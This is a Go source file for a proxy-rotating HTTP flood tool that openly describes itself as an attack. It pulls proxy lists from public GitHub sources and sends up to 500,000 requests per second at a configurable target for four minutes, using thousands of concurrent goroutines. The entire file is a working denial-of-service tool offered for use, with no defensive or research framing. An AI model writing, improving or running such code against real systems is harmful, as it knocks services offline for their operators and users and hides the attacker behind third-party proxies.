package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Configuration
const (
	targetURL          = "http://example.com" // Replace with your target URL
	durationSeconds    = 240
	requestsPerSecond  = 500000
	proxyFetchInterval = 5 * time.Minute // Fetch proxies periodically
)

var (
	proxySources        = []string{
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
	}
	proxies             []string
	mu                  sync.RWMutex
	proxyFetcherRunning bool
	fatalError          atomic.Bool // If set, stop all execution
)

// Logs error and exits immediately
func logFatalError(message string, err error) {
	fmt.Fprintf(os.Stderr, "FATAL ERROR: %s: %v\n", message, err)
	fatalError.Store(true)
}

// Fetch proxies from external sources
func fetchProxies() {
	if proxyFetcherRunning {
		return
	}
	proxyFetcherRunning = true
	defer func() {
		proxyFetcherRunning = false
	}()

	newProxies := make(map[string]bool)
	var wg sync.WaitGroup

	for _, sourceURL := range proxySources {
		wg.Add(1)
		go func(urlStr string) {
			defer wg.Done()
			fmt.Printf("Fetching proxies from: %s\n", urlStr)
			resp, err := http.Get(urlStr)
			if err != nil {
				logFatalError(fmt.Sprintf("Error fetching proxies from %s", urlStr), err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode != http.StatusOK {
				logFatalError(fmt.Sprintf("Failed to fetch proxies, status code: %d", resp.StatusCode), nil)
				return
			}

			scanner := bufio.NewScanner(resp.Body)
			for scanner.Scan() {
				proxy := strings.TrimSpace(scanner.Text())
				if proxy != "" {
					newProxies[proxy] = true
				}
			}
			if err := scanner.Err(); err != nil {
				logFatalError(fmt.Sprintf("Error reading proxies from %s", urlStr), err)
			}
		}(sourceURL)
	}
	wg.Wait()

	// Save proxies
	mu.Lock()
	proxies = make([]string, 0, len(newProxies))
	for p := range newProxies {
		proxies = append(proxies, p)
	}
	mu.Unlock()

	if len(proxies) == 0 {
		logFatalError("No valid proxies fetched", nil)
	}
	fmt.Printf("Fetched %d proxies.\n", len(proxies))
}

// Send request using a proxy, logging errors and status codes
func sendRequestWithProxy(urlStr string, proxyURLStr string, client *http.Client, wg *sync.WaitGroup, requestCounter *int64) {
	defer wg.Done()

	proxyURL, err := url.Parse(proxyURLStr)
	if err != nil {
		logFatalError(fmt.Sprintf("Invalid proxy URL: %s", proxyURLStr), err)
		return
	}

	transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	client.Transport = transport

	resp, err := client.Get(urlStr)
	if err != nil {
		logFatalError(fmt.Sprintf("Request failed using proxy %s", proxyURLStr), err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Response from %s via proxy %s: %d\n", urlStr, proxyURLStr, resp.StatusCode)

	if resp.StatusCode != http.StatusOK {
		logFatalError(fmt.Sprintf("Received non-OK status %d", resp.StatusCode), nil)
	}

	atomic.AddInt64(requestCounter, 1)
}

func main() {
	duration := time.Duration(durationSeconds) * time.Second
	totalRequests := int64(requestsPerSecond * durationSeconds)

	// Fetch proxies before starting
	fetchProxies()
	go func() {
		ticker := time.NewTicker(proxyFetchInterval)
		defer ticker.Stop()
		for range ticker.C {
			fetchProxies()
		}
	}()

	startTime := time.Now()
	endTime := startTime.Add(duration)
	var requestsSent int64
	var wg sync.WaitGroup

	fmt.Printf("Starting attack: %d requests to %s over %s...\n", totalRequests, targetURL, duration)

	concurrency := 10000

	for time.Now().Before(endTime) && atomic.LoadInt64(&requestsSent) < totalRequests {
		if fatalError.Load() {
			fmt.Println("Stopping execution due to fatal error.")
			break
		}

		mu.RLock()
		numProxies := len(proxies)
		mu.RUnlock()

		if numProxies > 0 {
			for i := 0; i < concurrency && atomic.LoadInt64(&requestsSent) < totalRequests; i++ {
				mu.RLock()
				proxyIndex := atomic.LoadInt64(&requestsSent) % int64(numProxies)
				proxyURL := proxies[proxyIndex]
				mu.RUnlock()

				client := &http.Client{Timeout: 10 * time.Second}

				wg.Add(1)
				go sendRequestWithProxy(targetURL, proxyURL, client, &wg, &requestsSent)
			}
			time.Sleep(1 * time.Millisecond)
		} else {
			logFatalError("No proxies available. Stopping execution.", nil)
		}
	}

	fmt.Println("Waiting for all requests to complete...")
	wg.Wait()

	elapsedTime := time.Since(startTime)
	actualRPS := float64(atomic.LoadInt64(&requestsSent)) / elapsedTime.Seconds()

	fmt.Printf("\nAttack finished in %s\n", elapsedTime)
	fmt.Printf("Total requests sent: %d\n", atomic.LoadInt64(&requestsSent))
	fmt.Printf("Achieved RPS: %.2f\n", actualRPS)
}
